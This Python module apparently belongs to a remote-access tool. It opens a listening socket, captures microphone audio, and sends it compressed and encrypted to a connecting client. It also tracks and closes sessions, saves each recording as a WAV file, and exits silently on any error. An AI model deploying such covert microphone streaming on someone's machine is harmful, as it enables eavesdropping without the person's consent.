import socket
import pickle
import zlib
import time
import pyaudio
import wave
from sys import exit
from Specific.encrypt import Encryption
from Utilities.db_queries import get_module_data


try:
	# Address
	info = get_module_data()
	# Settings
	talk_settings = []
	# Socket
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((info[1], int(info[3].split(',')[4])))
	s.listen()
except:
	exit(0)


def talk_info():
	info = '\n'
	
	for index, setting in enumerate(talk_settings):
		info += f'    - {setting[0]}[{index}]'
		if len(talk_settings) > 1 and index + 1 != len(talk_settings):
			info += '\n'
	
	if len(talk_settings) == 0:
		info = 'False'
		
	return info


def set_talk_settings(index):
	global talk_settings

	try:
		if index == '*':
			for talk_setting in talk_settings:
				talk_setting[1].close()
			return 'Talks closed!'
		else:
			talk_settings[int(index)][1].close()
			return 'Talk closed!'
	except:
		return 'Talk failed to close.'


def Talk(encoding, path, user):
	try:
		global talk_settings

		CHUNK = 81920
		FORMAT = pyaudio.paInt16
		CHANNELS = 2
		RATE = 44100
		headersize = 10
		new_msg = True
		msg_len = 0
		full_msg = b''
		frames = []

		e = Encryption()
		client, addr = s.accept()

		u = (user, client, addr)
		talk_settings.append(u)

		p = pyaudio.PyAudio()
		stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, output=False, frames_per_buffer=CHUNK)

		msg = pickle.dumps(stream.read(CHUNK))
		msg = zlib.compress(msg, 1)
		msg = e.do_encrypt(msg)
		final_msg = bytes(f'{len(msg):<{headersize}}', encoding) + msg
		client.send(final_msg)

		while True:
			try:
				client_msg = client.recv(1024)

				if new_msg:
					msg_len = int(client_msg[:headersize])
					new_msg = False

				full_msg += client_msg

				if len(full_msg)-headersize == msg_len:
					data = stream.read(CHUNK)
					frames.append(data)

					msg = pickle.dumps(data)
					msg = zlib.compress(msg, 1)
					msg = e.do_encrypt(msg)
					final_msg = bytes(f'{len(msg):<{headersize}}', encoding) + msg
					client.send(final_msg)
					
					new_msg = True
					msg_len = 0
					full_msg = b''
			except:
				talk_settings.remove(u)
				waveFile = wave.open(f'{path}/{time.strftime("%Y-%m-%d (%H-%M-%S)")}.wav', 'wb')
				waveFile.setnchannels(CHANNELS)
				waveFile.setsampwidth(p.get_sample_size(FORMAT))
				waveFile.setframerate(RATE)
				waveFile.writeframes(b''.join(frames))
				waveFile.close()
				exit(0)
	except:
		exit(0)